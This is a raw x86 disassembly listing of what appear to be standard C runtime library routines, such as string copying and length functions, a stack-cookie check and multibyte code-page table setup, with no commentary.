  425595:	jne    0x4255a6
  425597:	call   0x4273d0
  42559c:	mov    DWORD PTR [eax],0xc
  4255a2:	xor    eax,eax
  4255a4:	jmp    0x4255eb
  4255a6:	push   0xa
  4255a8:	call   0x4255ef
  4255ad:	cmp    DWORD PTR [esi],0x0
  4255b0:	pop    ecx
  4255b1:	jne    0x4255d9
  4255b3:	push   0xfa0
  4255b8:	push   edi
  4255b9:	call   0x4264bd
  4255be:	test   eax,eax
  4255c0:	pop    ecx
  4255c1:	pop    ecx
  4255c2:	jne    0x4255d5
  4255c4:	push   edi
  4255c5:	call   0x42603a
  4255ca:	push   0xa
  4255cc:	call   0x42555b
  4255d1:	pop    ecx
  4255d2:	pop    ecx
  4255d3:	jmp    0x425597
  4255d5:	mov    DWORD PTR [esi],edi
  4255d7:	jmp    0x4255e0
  4255d9:	push   edi
  4255da:	call   0x42603a
  4255df:	pop    ecx
  4255e0:	push   0xa
  4255e2:	call   0x42555b
  4255e7:	xor    eax,eax
  4255e9:	pop    ecx
  4255ea:	inc    eax
  4255eb:	pop    edi
  4255ec:	pop    esi
  4255ed:	pop    ebp
  4255ee:	ret    
  4255ef:	push   ebp
  4255f0:	mov    ebp,esp
  4255f2:	mov    eax,DWORD PTR [ebp+0x8]
  4255f5:	push   esi
  4255f6:	lea    esi,[eax*8+0x462e10]
  4255fd:	cmp    DWORD PTR [esi],0x0
  425600:	jne    0x425615
  425602:	push   eax
  425603:	call   0x425570
  425608:	test   eax,eax
  42560a:	pop    ecx
  42560b:	jne    0x425615
  42560d:	push   0x11
  42560f:	call   0x4244fc
  425614:	pop    ecx
  425615:	push   DWORD PTR [esi]
  425617:	call   DWORD PTR ds:0x4290f4
  42561d:	pop    esi
  42561e:	pop    ebp
  42561f:	ret    
  425620:	push   esi
  425621:	push   DWORD PTR ds:0x463d68
  425627:	call   0x427586
  42562c:	pop    ecx
  42562d:	mov    ecx,DWORD PTR ds:0x463d64
  425633:	mov    esi,eax
  425635:	mov    eax,ds:0x463d68
  42563a:	mov    edx,ecx
  42563c:	sub    edx,eax
  42563e:	add    edx,0x4
  425641:	cmp    esi,edx
  425643:	jae    0x425693
  425645:	mov    ecx,0x800
  42564a:	cmp    esi,ecx
  42564c:	jae    0x425650
  42564e:	mov    ecx,esi
  425650:	add    ecx,esi
  425652:	push   ecx
  425653:	push   eax
  425654:	call   0x4273d9
  425659:	test   eax,eax
  42565b:	pop    ecx
  42565c:	pop    ecx
  42565d:	jne    0x425676
  42565f:	add    esi,0x10
  425662:	push   esi
  425663:	push   DWORD PTR ds:0x463d68
  425669:	call   0x4273d9
  42566e:	test   eax,eax
  425670:	pop    ecx
  425671:	pop    ecx
  425672:	jne    0x425676
  425674:	pop    esi
  425675:	ret    
  425676:	mov    ecx,DWORD PTR ds:0x463d64
  42567c:	sub    ecx,DWORD PTR ds:0x463d68
  425682:	mov    ds:0x463d68,eax
  425687:	sar    ecx,0x2
  42568a:	lea    ecx,[eax+ecx*4]
  42568d:	mov    DWORD PTR ds:0x463d64,ecx
  425693:	mov    DWORD PTR [ecx],edi
  425695:	add    DWORD PTR ds:0x463d64,0x4
  42569c:	mov    eax,edi
  42569e:	pop    esi
  42569f:	ret    
  4256a0:	push   0x80
  4256a5:	call   0x426152
  4256aa:	test   eax,eax
  4256ac:	pop    ecx
  4256ad:	mov    ds:0x463d68,eax
  4256b2:	jne    0x4256b8
  4256b4:	push   0x18
  4256b6:	pop    eax
  4256b7:	ret    
  4256b8:	and    DWORD PTR [eax],0x0
  4256bb:	mov    eax,ds:0x463d68
  4256c0:	mov    ds:0x463d64,eax
  4256c5:	xor    eax,eax
  4256c7:	ret    
  4256c8:	push   0xc
  4256ca:	push   0x429618
  4256cf:	call   0x425434
  4256d4:	call   0x424747
  4256d9:	and    DWORD PTR [ebp-0x4],0x0
  4256dd:	mov    edi,DWORD PTR [ebp+0x8]
  4256e0:	call   0x425620
  4256e5:	mov    DWORD PTR [ebp-0x1c],eax
  4256e8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4256ec:	call   0x4256fa
  4256f1:	mov    eax,DWORD PTR [ebp-0x1c]
  4256f4:	call   0x42546f
  4256f9:	ret    
  4256fa:	call   0x424750
  4256ff:	ret    
  425700:	push   DWORD PTR [esp+0x4]
  425704:	call   0x4256c8
  425709:	neg    eax
  42570b:	sbb    eax,eax
  42570d:	neg    eax
  42570f:	pop    ecx
  425710:	dec    eax
  425711:	ret    
  425712:	push   ebp
  425713:	mov    ebp,esp
  425715:	sub    esp,0x10
  425718:	push   ebx
  425719:	xor    ebx,ebx
  42571b:	cmp    DWORD PTR ds:0x463870,ebx
  425721:	push   esi
  425722:	push   edi
  425723:	jne    0x425792
  425725:	push   0x429688
  42572a:	call   DWORD PTR ds:0x4290f8
  425730:	mov    edi,eax
  425732:	cmp    edi,ebx
  425734:	je     0x4257cd
  42573a:	mov    esi,DWORD PTR ds:0x429028
  425740:	push   0x42967c
  425745:	push   edi
  425746:	call   esi
  425748:	test   eax,eax
  42574a:	mov    ds:0x463870,eax
  42574f:	je     0x4257cd
  425751:	push   0x42966c
  425756:	push   edi
  425757:	call   esi
  425759:	push   0x429658
  42575e:	push   edi
  42575f:	mov    ds:0x463874,eax
  425764:	call   esi
  425766:	cmp    DWORD PTR ds:0x4635c4,0x2
  42576d:	mov    ds:0x463878,eax
  425772:	jne    0x425792
  425774:	push   0x42963c
  425779:	push   edi
  42577a:	call   esi
  42577c:	test   eax,eax
  42577e:	mov    ds:0x463880,eax
  425783:	je     0x425792
  425785:	push   0x429624
  42578a:	push   edi
  42578b:	call   esi
  42578d:	mov    ds:0x46387c,eax
  425792:	mov    eax,ds:0x46387c
  425797:	test   eax,eax
  425799:	je     0x4257d7
  42579b:	call   eax
  42579d:	test   eax,eax
  42579f:	je     0x4257be
  4257a1:	lea    ecx,[ebp-0x4]
  4257a4:	push   ecx
  4257a5:	push   0xc
  4257a7:	lea    ecx,[ebp-0x10]
  4257aa:	push   ecx
  4257ab:	push   0x1
  4257ad:	push   eax
  4257ae:	call   DWORD PTR ds:0x463880
  4257b4:	test   eax,eax
  4257b6:	je     0x4257be
  4257b8:	test   BYTE PTR [ebp-0x8],0x1
  4257bc:	jne    0x4257d7
  4257be:	cmp    DWORD PTR ds:0x4635d0,0x4
  4257c5:	jb     0x4257d1
  4257c7:	or     BYTE PTR [ebp+0x12],0x20
  4257cb:	jmp    0x4257f6
  4257cd:	xor    eax,eax
  4257cf:	jmp    0x425806
  4257d1:	or     BYTE PTR [ebp+0x12],0x4
  4257d5:	jmp    0x4257f6
  4257d7:	mov    eax,ds:0x463874
  4257dc:	test   eax,eax
  4257de:	je     0x4257f6
  4257e0:	call   eax
  4257e2:	mov    ebx,eax
  4257e4:	test   ebx,ebx
  4257e6:	je     0x4257f6
  4257e8:	mov    eax,ds:0x463878
  4257ed:	test   eax,eax
  4257ef:	je     0x4257f6
  4257f1:	push   ebx
  4257f2:	call   eax
  4257f4:	mov    ebx,eax
  4257f6:	push   DWORD PTR [ebp+0x10]
  4257f9:	push   DWORD PTR [ebp+0xc]
  4257fc:	push   DWORD PTR [ebp+0x8]
  4257ff:	push   ebx
  425800:	call   DWORD PTR ds:0x463870
  425806:	pop    edi
  425807:	pop    esi
  425808:	pop    ebx
  425809:	leave  
  42580a:	ret    
  42580b:	int3   
  42580c:	int3   
  42580d:	int3   
  42580e:	int3   
  42580f:	int3   
  425810:	push   edi
  425811:	mov    edi,DWORD PTR [esp+0x8]
  425815:	jmp    0x425885
  425817:	lea    esp,[esp+0x0]
  42581e:	mov    edi,edi
  425820:	mov    ecx,DWORD PTR [esp+0x4]
  425824:	push   edi
  425825:	test   ecx,0x3
  42582b:	je     0x425840
  42582d:	mov    al,BYTE PTR [ecx]
  42582f:	add    ecx,0x1
  425832:	test   al,al
  425834:	je     0x425873
  425836:	test   ecx,0x3
  42583c:	jne    0x42582d
  42583e:	mov    edi,edi
  425840:	mov    eax,DWORD PTR [ecx]
  425842:	mov    edx,0x7efefeff
  425847:	add    edx,eax
  425849:	xor    eax,0xffffffff
  42584c:	xor    eax,edx
  42584e:	add    ecx,0x4
  425851:	test   eax,0x81010100
  425856:	je     0x425840
  425858:	mov    eax,DWORD PTR [ecx-0x4]
  42585b:	test   al,al
  42585d:	je     0x425882
  42585f:	test   ah,ah
  425861:	je     0x42587d
  425863:	test   eax,0xff0000
  425868:	je     0x425878
  42586a:	test   eax,0xff000000
  42586f:	je     0x425873
  425871:	jmp    0x425840
  425873:	lea    edi,[ecx-0x1]
  425876:	jmp    0x425885
  425878:	lea    edi,[ecx-0x2]
  42587b:	jmp    0x425885
  42587d:	lea    edi,[ecx-0x3]
  425880:	jmp    0x425885
  425882:	lea    edi,[ecx-0x4]
  425885:	mov    ecx,DWORD PTR [esp+0xc]
  425889:	test   ecx,0x3
  42588f:	je     0x4258ae
  425891:	mov    dl,BYTE PTR [ecx]
  425893:	add    ecx,0x1
  425896:	test   dl,dl
  425898:	je     0x425900
  42589a:	mov    BYTE PTR [edi],dl
  42589c:	add    edi,0x1
  42589f:	test   ecx,0x3
  4258a5:	jne    0x425891
  4258a7:	jmp    0x4258ae
  4258a9:	mov    DWORD PTR [edi],edx
  4258ab:	add    edi,0x4
  4258ae:	mov    edx,0x7efefeff
  4258b3:	mov    eax,DWORD PTR [ecx]
  4258b5:	add    edx,eax
  4258b7:	xor    eax,0xffffffff
  4258ba:	xor    eax,edx
  4258bc:	mov    edx,DWORD PTR [ecx]
  4258be:	add    ecx,0x4
  4258c1:	test   eax,0x81010100
  4258c6:	je     0x4258a9
  4258c8:	test   dl,dl
  4258ca:	je     0x425900
  4258cc:	test   dh,dh
  4258ce:	je     0x4258f7
  4258d0:	test   edx,0xff0000
  4258d6:	je     0x4258ea
  4258d8:	test   edx,0xff000000
  4258de:	je     0x4258e2
  4258e0:	jmp    0x4258a9
  4258e2:	mov    DWORD PTR [edi],edx
  4258e4:	mov    eax,DWORD PTR [esp+0x8]
  4258e8:	pop    edi
  4258e9:	ret    
  4258ea:	mov    WORD PTR [edi],dx
  4258ed:	mov    eax,DWORD PTR [esp+0x8]
  4258f1:	mov    BYTE PTR [edi+0x2],0x0
  4258f5:	pop    edi
  4258f6:	ret    
  4258f7:	mov    WORD PTR [edi],dx
  4258fa:	mov    eax,DWORD PTR [esp+0x8]
  4258fe:	pop    edi
  4258ff:	ret    
  425900:	mov    BYTE PTR [edi],dl
  425902:	mov    eax,DWORD PTR [esp+0x8]
  425906:	pop    edi
  425907:	ret    
  425908:	int3   
  425909:	int3   
  42590a:	int3   
  42590b:	int3   
  42590c:	int3   
  42590d:	int3   
  42590e:	int3   
  42590f:	int3   
  425910:	mov    ecx,DWORD PTR [esp+0xc]
  425914:	push   edi
  425915:	test   ecx,ecx
  425917:	je     0x4259af
  42591d:	push   esi
  42591e:	push   ebx
  42591f:	mov    ebx,ecx
  425921:	mov    esi,DWORD PTR [esp+0x14]
  425925:	test   esi,0x3
  42592b:	mov    edi,DWORD PTR [esp+0x10]
  42592f:	jne    0x42593c
  425931:	shr    ecx,0x2
  425934:	jne    0x4259bf
  42593a:	jmp    0x425963
  42593c:	mov    al,BYTE PTR [esi]
  42593e:	add    esi,0x1
  425941:	mov    BYTE PTR [edi],al
  425943:	add    edi,0x1
  425946:	sub    ecx,0x1
  425949:	je     0x425976
  42594b:	test   al,al
  42594d:	je     0x42597e
  42594f:	test   esi,0x3
  425955:	jne    0x42593c
  425957:	mov    ebx,ecx
  425959:	shr    ecx,0x2
  42595c:	jne    0x4259bf
  42595e:	and    ebx,0x3
  425961:	je     0x425976
  425963:	mov    al,BYTE PTR [esi]
  425965:	add    esi,0x1
  425968:	mov    BYTE PTR [edi],al
  42596a:	add    edi,0x1
  42596d:	test   al,al
  42596f:	je     0x4259a8
  425971:	sub    ebx,0x1
  425974:	jne    0x425963
  425976:	mov    eax,DWORD PTR [esp+0x10]
  42597a:	pop    ebx
  42597b:	pop    esi
  42597c:	pop    edi
  42597d:	ret    
  42597e:	test   edi,0x3
  425984:	je     0x42599c
  425986:	mov    BYTE PTR [edi],al
  425988:	add    edi,0x1
  42598b:	sub    ecx,0x1
  42598e:	je     0x425a2c
  425994:	test   edi,0x3
  42599a:	jne    0x425986
  42599c:	mov    ebx,ecx
  42599e:	shr    ecx,0x2
  4259a1:	jne    0x425a17
  4259a3:	mov    BYTE PTR [edi],al
  4259a5:	add    edi,0x1
  4259a8:	sub    ebx,0x1
  4259ab:	jne    0x4259a3
  4259ad:	pop    ebx
  4259ae:	pop    esi
  4259af:	mov    eax,DWORD PTR [esp+0x8]
  4259b3:	pop    edi
  4259b4:	ret    
  4259b5:	mov    DWORD PTR [edi],edx
  4259b7:	add    edi,0x4
  4259ba:	sub    ecx,0x1
  4259bd:	je     0x42595e
  4259bf:	mov    edx,0x7efefeff
  4259c4:	mov    eax,DWORD PTR [esi]
  4259c6:	add    edx,eax
  4259c8:	xor    eax,0xffffffff
  4259cb:	xor    eax,edx
  4259cd:	mov    edx,DWORD PTR [esi]
  4259cf:	add    esi,0x4
  4259d2:	test   eax,0x81010100
  4259d7:	je     0x4259b5
  4259d9:	test   dl,dl
  4259db:	je     0x425a09
  4259dd:	test   dh,dh
  4259df:	je     0x4259ff
  4259e1:	test   edx,0xff0000
  4259e7:	je     0x4259f5
  4259e9:	test   edx,0xff000000
  4259ef:	jne    0x4259b5
  4259f1:	mov    DWORD PTR [edi],edx
  4259f3:	jmp    0x425a0d
  4259f5:	and    edx,0xffff
  4259fb:	mov    DWORD PTR [edi],edx
  4259fd:	jmp    0x425a0d
  4259ff:	and    edx,0xff
  425a05:	mov    DWORD PTR [edi],edx
  425a07:	jmp    0x425a0d
  425a09:	xor    edx,edx
  425a0b:	mov    DWORD PTR [edi],edx
  425a0d:	add    edi,0x4
  425a10:	xor    eax,eax
  425a12:	sub    ecx,0x1
  425a15:	je     0x425a23
  425a17:	xor    eax,eax
  425a19:	mov    DWORD PTR [edi],eax
  425a1b:	add    edi,0x4
  425a1e:	sub    ecx,0x1
  425a21:	jne    0x425a19
  425a23:	and    ebx,0x3
  425a26:	jne    0x4259a3
  425a2c:	mov    eax,DWORD PTR [esp+0x10]
  425a30:	pop    ebx
  425a31:	pop    esi
  425a32:	pop    edi
  425a33:	ret    
  425a34:	int3   
  425a35:	int3   
  425a36:	int3   
  425a37:	int3   
  425a38:	int3   
  425a39:	int3   
  425a3a:	int3   
  425a3b:	int3   
  425a3c:	int3   
  425a3d:	int3   
  425a3e:	int3   
  425a3f:	int3   
  425a40:	mov    ecx,DWORD PTR [esp+0x4]
  425a44:	test   ecx,0x3
  425a4a:	je     0x425a70
  425a4c:	mov    al,BYTE PTR [ecx]
  425a4e:	add    ecx,0x1
  425a51:	test   al,al
  425a53:	je     0x425aa3
  425a55:	test   ecx,0x3
  425a5b:	jne    0x425a4c
  425a5d:	add    eax,0x0
  425a62:	lea    esp,[esp+0x0]
  425a69:	lea    esp,[esp+0x0]
  425a70:	mov    eax,DWORD PTR [ecx]
  425a72:	mov    edx,0x7efefeff
  425a77:	add    edx,eax
  425a79:	xor    eax,0xffffffff
  425a7c:	xor    eax,edx
  425a7e:	add    ecx,0x4
  425a81:	test   eax,0x81010100
  425a86:	je     0x425a70
  425a88:	mov    eax,DWORD PTR [ecx-0x4]
  425a8b:	test   al,al
  425a8d:	je     0x425ac1
  425a8f:	test   ah,ah
  425a91:	je     0x425ab7
  425a93:	test   eax,0xff0000
  425a98:	je     0x425aad
  425a9a:	test   eax,0xff000000
  425a9f:	je     0x425aa3
  425aa1:	jmp    0x425a70
  425aa3:	lea    eax,[ecx-0x1]
  425aa6:	mov    ecx,DWORD PTR [esp+0x4]
  425aaa:	sub    eax,ecx
  425aac:	ret    
  425aad:	lea    eax,[ecx-0x2]
  425ab0:	mov    ecx,DWORD PTR [esp+0x4]
  425ab4:	sub    eax,ecx
  425ab6:	ret    
  425ab7:	lea    eax,[ecx-0x3]
  425aba:	mov    ecx,DWORD PTR [esp+0x4]
  425abe:	sub    eax,ecx
  425ac0:	ret    
  425ac1:	lea    eax,[ecx-0x4]
  425ac4:	mov    ecx,DWORD PTR [esp+0x4]
  425ac8:	sub    eax,ecx
  425aca:	ret    
  425acb:	push   0x8
  425acd:	push   0x429698
  425ad2:	call   0x425434
  425ad7:	and    DWORD PTR [ebp-0x4],0x0
  425adb:	push   0x0
  425add:	push   0x1
  425adf:	call   0x427652
  425ae4:	pop    ecx
  425ae5:	pop    ecx
  425ae6:	jmp    0x425aef
  425ae8:	xor    eax,eax
  425aea:	inc    eax
  425aeb:	ret    
  425aec:	mov    esp,DWORD PTR [ebp-0x18]
  425aef:	or     DWORD PTR [ebp-0x4],0xffffffff
  425af3:	push   0x3
  425af5:	call   DWORD PTR ds:0x42909c
  425afb:	int3   
  425afc:	cmp    ecx,DWORD PTR ds:0x462f30
  425b02:	jne    0x425b05
  425b04:	ret    
  425b05:	jmp    0x425acb
  425b0a:	movzx  eax,BYTE PTR [esp+0x4]
  425b0f:	mov    cl,BYTE PTR [esp+0xc]
  425b13:	test   BYTE PTR [eax+0x463a21],cl
  425b19:	jne    0x425b37
  425b1b:	cmp    DWORD PTR [esp+0x8],0x0
  425b20:	je     0x425b30
  425b22:	movzx  eax,WORD PTR [eax*2+0x429a92]
  425b2a:	and    eax,DWORD PTR [esp+0x8]
  425b2e:	jmp    0x425b32
  425b30:	xor    eax,eax
  425b32:	test   eax,eax
  425b34:	jne    0x425b37
  425b36:	ret    
  425b37:	xor    eax,eax
  425b39:	inc    eax
  425b3a:	ret    
  425b3b:	push   0x4
  425b3d:	push   0x0
  425b3f:	push   DWORD PTR [esp+0xc]
  425b43:	call   0x425b0a
  425b48:	add    esp,0xc
  425b4b:	ret    
  425b4c:	sub    eax,0x3a4
  425b51:	je     0x425b75
  425b53:	sub    eax,0x4
  425b56:	je     0x425b6f
  425b58:	sub    eax,0xd
  425b5b:	je     0x425b69
  425b5d:	dec    eax
  425b5e:	je     0x425b63
  425b60:	xor    eax,eax
  425b62:	ret    
  425b63:	mov    eax,0x404
  425b68:	ret    
  425b69:	mov    eax,0x412
  425b6e:	ret    
  425b6f:	mov    eax,0x804
  425b74:	ret    
  425b75:	mov    eax,0x411
  425b7a:	ret    
  425b7b:	push   edi
  425b7c:	push   0x40
  425b7e:	xor    eax,eax
  425b80:	pop    ecx
  425b81:	mov    edi,0x463a20
  425b86:	rep stos DWORD PTR es:[edi],eax
  425b88:	stos   BYTE PTR es:[edi],al
  425b89:	xor    eax,eax
  425b8b:	mov    ds:0x463b24,eax
  425b90:	mov    ds:0x463a1c,eax
  425b95:	mov    ds:0x463a14,eax
  425b9a:	mov    edi,0x463b30
  425b9f:	stos   DWORD PTR es:[edi],eax
  425ba0:	stos   DWORD PTR es:[edi],eax
  425ba1:	stos   DWORD PTR es:[edi],eax
  425ba2:	pop    edi
  425ba3:	ret    
  425ba4:	push   ebp
  425ba5:	mov    ebp,esp
  425ba7:	sub    esp,0x518
  425bad:	mov    eax,ds:0x462f30
  425bb2:	xor    eax,DWORD PTR [ebp+0x4]
  425bb5:	push   esi
  425bb6:	mov    DWORD PTR [ebp-0x4],eax
  425bb9:	lea    eax,[ebp-0x18]
  425bbc:	push   eax
  425bbd:	push   DWORD PTR ds:0x463b24
  425bc3:	call   DWORD PTR ds:0x429104
  425bc9:	cmp    eax,0x1
  425bcc:	mov    esi,0x100
  425bd1:	jne    0x425ce4
  425bd7:	xor    eax,eax
  425bd9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425be0:	inc    eax
  425be1:	cmp    eax,esi
  425be3:	jb     0x425bd9
  425be5:	mov    al,BYTE PTR [ebp-0x12]
  425be8:	test   al,al
  425bea:	mov    BYTE PTR [ebp-0x118],0x20
  425bf1:	je     0x425c29
  425bf3:	push   ebx
  425bf4:	lea    edx,[ebp-0x11]
  425bf7:	push   edi
  425bf8:	movzx  ecx,BYTE PTR [edx]
  425bfb:	movzx  eax,al
  425bfe:	cmp    eax,ecx
  425c00:	ja     0x425c1f
  425c02:	sub    ecx,eax
  425c04:	inc    ecx
  425c05:	mov    ebx,ecx
  425c07:	shr    ecx,0x2
  425c0a:	lea    edi,[ebp+eax*1-0x118]
  425c11:	mov    eax,0x20202020
  425c16:	rep stos DWORD PTR es:[edi],eax
  425c18:	mov    ecx,ebx
  425c1a:	and    ecx,0x3
  425c1d:	rep stos BYTE PTR es:[edi],al
  425c1f:	inc    edx
  425c20:	mov    al,BYTE PTR [edx]
  425c22:	inc    edx
  425c23:	test   al,al
  425c25:	jne    0x425bf8
  425c27:	pop    edi
  425c28:	pop    ebx
  425c29:	push   0x0
  425c2b:	push   DWORD PTR ds:0x463a14
  425c31:	lea    eax,[ebp-0x518]
  425c37:	push   DWORD PTR ds:0x463b24
  425c3d:	push   eax
  425c3e:	push   esi
  425c3f:	lea    eax,[ebp-0x118]
  425c45:	push   eax
  425c46:	push   0x1
  425c48:	call   0x427b58
  425c4d:	push   0x0
  425c4f:	push   DWORD PTR ds:0x463b24
  425c55:	lea    eax,[ebp-0x218]
  425c5b:	push   esi
  425c5c:	push   eax
  425c5d:	push   esi
  425c5e:	lea    eax,[ebp-0x118]
  425c64:	push   eax
  425c65:	push   esi
  425c66:	push   DWORD PTR ds:0x463a14
  425c6c:	call   0x42779c
  425c71:	push   0x0
  425c73:	push   DWORD PTR ds:0x463b24
  425c79:	lea    eax,[ebp-0x318]
  425c7f:	push   esi
  425c80:	push   eax
  425c81:	push   esi
  425c82:	lea    eax,[ebp-0x118]
  425c88:	push   eax
  425c89:	push   0x200
  425c8e:	push   DWORD PTR ds:0x463a14
  425c94:	call   0x42779c
  425c99:	add    esp,0x5c
  425c9c:	xor    eax,eax
  425c9e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425ca6:	test   cl,0x1
  425ca9:	je     0x425cc1
  425cab:	or     BYTE PTR [eax+0x463a21],0x10
  425cb2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425cb9:	mov    BYTE PTR [eax+0x463b40],cl
  425cbf:	jmp    0x425cdd
  425cc1:	test   cl,0x2
  425cc4:	je     0x425cd6
  425cc6:	or     BYTE PTR [eax+0x463a21],0x20
  425ccd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425cd4:	jmp    0x425cb9
  425cd6:	and    BYTE PTR [eax+0x463b40],0x0
  425cdd:	inc    eax
  425cde:	cmp    eax,esi
  425ce0:	jb     0x425c9e
  425ce2:	jmp    0x425d28
  425ce4:	xor    eax,eax
  425ce6:	cmp    eax,0x41
  425ce9:	jb     0x425d04
  425ceb:	cmp    eax,0x5a
  425cee:	ja     0x425d04
  425cf0:	or     BYTE PTR [eax+0x463a21],0x10
  425cf7:	mov    cl,al
  425cf9:	add    cl,0x20
  425cfc:	mov    BYTE PTR [eax+0x463b40],cl
  425d02:	jmp    0x425d23
  425d04:	cmp    eax,0x61
  425d07:	jb     0x425d1c
  425d09:	cmp    eax,0x7a
  425d0c:	ja     0x425d1c
  425d0e:	or     BYTE PTR [eax+0x463a21],0x20
  425d15:	mov    cl,al
  425d17:	sub    cl,0x20
  425d1a:	jmp    0x425cfc
  425d1c:	and    BYTE PTR [eax+0x463b40],0x0
  425d23:	inc    eax
  425d24:	cmp    eax,esi
  425d26:	jb     0x425ce6
  425d28:	mov    ecx,DWORD PTR [ebp-0x4]
  425d2b:	xor    ecx,DWORD PTR [ebp+0x4]
  425d2e:	pop    esi
  425d2f:	call   0x425afc
  425d34:	leave  
  425d35:	ret    
  425d36:	push   ebp
  425d37:	mov    ebp,esp
  425d39:	sub    esp,0x1c
  425d3c:	mov    eax,ds:0x462f30
  425d41:	xor    eax,DWORD PTR [ebp+0x4]
  425d44:	push   ebx
  425d45:	push   esi
  425d46:	mov    esi,DWORD PTR [ebp+0x8]
  425d49:	xor    ebx,ebx
  425d4b:	cmp    esi,ebx
  425d4d:	mov    DWORD PTR [ebp-0x4],eax
  425d50:	push   edi
  425d51:	je     0x425eab
  425d57:	xor    edx,edx
  425d59:	xor    eax,eax
  425d5b:	cmp    DWORD PTR [eax+0x462f40],esi
  425d61:	je     0x425dc8
  425d63:	add    eax,0x30
  425d66:	inc    edx
  425d67:	cmp    eax,0xf0
  425d6c:	jb     0x425d5b
  425d6e:	lea    eax,[ebp-0x1c]
  425d71:	push   eax
  425d72:	push   esi
  425d73:	call   DWORD PTR ds:0x429104
  425d79:	cmp    eax,0x1
  425d7c:	jne    0x425ea3
  425d82:	push   0x40
  425d84:	xor    eax,eax
  425d86:	cmp    DWORD PTR [ebp-0x1c],0x1
  425d8a:	pop    ecx
  425d8b:	mov    edi,0x463a20
  425d90:	rep stos DWORD PTR es:[edi],eax
  425d92:	stos   BYTE PTR es:[edi],al
  425d93:	mov    DWORD PTR ds:0x463b24,esi
  425d99:	mov    DWORD PTR ds:0x463a14,ebx
  425d9f:	jbe    0x425e91
  425da5:	cmp    BYTE PTR [ebp-0x16],0x0
  425da9:	je     0x425e69
  425daf:	lea    ecx,[ebp-0x15]
  425db2:	mov    dl,BYTE PTR [ecx]
  425db4:	test   dl,dl
  425db6:	je     0x425e69
  425dbc:	movzx  eax,BYTE PTR [ecx-0x1]
  425dc0:	movzx  edx,dl
  425dc3:	jmp    0x425e59
  425dc8:	push   0x40
  425dca:	xor    eax,eax
  425dcc:	pop    ecx
  425dcd:	mov    edi,0x463a20
  425dd2:	rep stos DWORD PTR es:[edi],eax
  425dd4:	lea    ecx,[edx+edx*2]
  425dd7:	shl    ecx,0x4
  425dda:	mov    DWORD PTR [ebp-0x8],ebx
  425ddd:	stos   BYTE PTR es:[edi],al
  425dde:	lea    ebx,[ecx+0x462f50]
  425de4:	mov    al,BYTE PTR [ebx]
  425de6:	mov    esi,ebx
  425de8:	jmp    0x425e13
  425dea:	mov    dl,BYTE PTR [esi+0x1]
  425ded:	test   dl,dl
  425def:	je     0x425e17
  425df1:	movzx  eax,al
  425df4:	movzx  edi,dl
  425df7:	cmp    eax,edi
  425df9:	ja     0x425e0f
  425dfb:	mov    edx,DWORD PTR [ebp-0x8]
  425dfe:	mov    dl,BYTE PTR [edx+0x462f38]
  425e04:	or     BYTE PTR [eax+0x463a21],dl
  425e0a:	inc    eax
  425e0b:	cmp    eax,edi
  425e0d:	jbe    0x425e04
  425e0f:	inc    esi
  425e10:	inc    esi
  425e11:	mov    al,BYTE PTR [esi]
  425e13:	test   al,al
  425e15:	jne    0x425dea
  425e17:	inc    DWORD PTR [ebp-0x8]
  425e1a:	add    ebx,0x8
  425e1d:	cmp    DWORD PTR [ebp-0x8],0x4
  425e21:	jb     0x425de4
  425e23:	mov    eax,DWORD PTR [ebp+0x8]
  425e26:	mov    ds:0x463b24,eax
  425e2b:	mov    DWORD PTR ds:0x463a1c,0x1
  425e35:	call   0x425b4c
  425e3a:	lea    ecx,[ecx+0x462f44]
  425e40:	mov    esi,ecx
  425e42:	mov    edi,0x463b30
  425e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e49:	mov    ds:0x463a14,eax
  425e4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e4f:	jmp    0x425eb0
  425e51:	or     BYTE PTR [eax+0x463a21],0x4
  425e58:	inc    eax
  425e59:	cmp    eax,edx
  425e5b:	jbe    0x425e51
  425e5d:	inc    ecx
  425e5e:	inc    ecx
  425e5f:	cmp    BYTE PTR [ecx-0x1],0x0
  425e63:	jne    0x425db2
  425e69:	xor    ecx,ecx
  425e6b:	inc    ecx
  425e6c:	mov    eax,ecx
  425e6e:	or     BYTE PTR [eax+0x463a21],0x8
  425e75:	inc    eax
  425e76:	cmp    eax,0xff
  425e7b:	jb     0x425e6e
  425e7d:	mov    eax,esi
  425e7f:	call   0x425b4c
  425e84:	mov    ds:0x463a14,eax
  425e89:	mov    DWORD PTR ds:0x463a1c,ecx
  425e8f:	jmp    0x425e97
  425e91:	mov    DWORD PTR ds:0x463a1c,ebx
  425e97:	xor    eax,eax
  425e99:	mov    edi,0x463b30
  425e9e:	stos   DWORD PTR es:[edi],eax
  425e9f:	stos   DWORD PTR es:[edi],eax
  425ea0:	stos   DWORD PTR es:[edi],eax
  425ea1:	jmp    0x425eb0
  425ea3:	cmp    DWORD PTR ds:0x463884,ebx
  425ea9:	je     0x425eb9
  425eab:	call   0x425b7b
  425eb0:	call   0x425ba4
  425eb5:	xor    eax,eax
  425eb7:	jmp    0x425ebc
  425eb9:	or     eax,0xffffffff
  425ebc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ebf:	xor    ecx,DWORD PTR [ebp+0x4]
  425ec2:	pop    edi
  425ec3:	pop    esi
  425ec4:	pop    ebx
  425ec5:	call   0x425afc
  425eca:	leave  
  425ecb:	ret    
  425ecc:	push   0x14
  425ece:	push   0x4296a8
  425ed3:	call   0x425434
  425ed8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425edc:	push   0xd
  425ede:	call   0x4255ef
  425ee3:	pop    ecx
  425ee4:	xor    edi,edi
  425ee6:	mov    DWORD PTR [ebp-0x4],edi
  425ee9:	mov    DWORD PTR ds:0x463884,edi
  425eef:	mov    eax,DWORD PTR [ebp+0x8]
  425ef2:	cmp    eax,0xfffffffe
  425ef5:	jne    0x425f09
  425ef7:	mov    DWORD PTR ds:0x463884,0x1
  425f01:	call   DWORD PTR ds:0x429100
  425f07:	jmp    0x425f34
  425f09:	cmp    eax,0xfffffffd
  425f0c:	jne    0x425f20
  425f0e:	mov    DWORD PTR ds:0x463884,0x1
  425f18:	call   DWORD PTR ds:0x4290fc
  425f1e:	jmp    0x425f34
  425f20:	cmp    eax,0xfffffffc
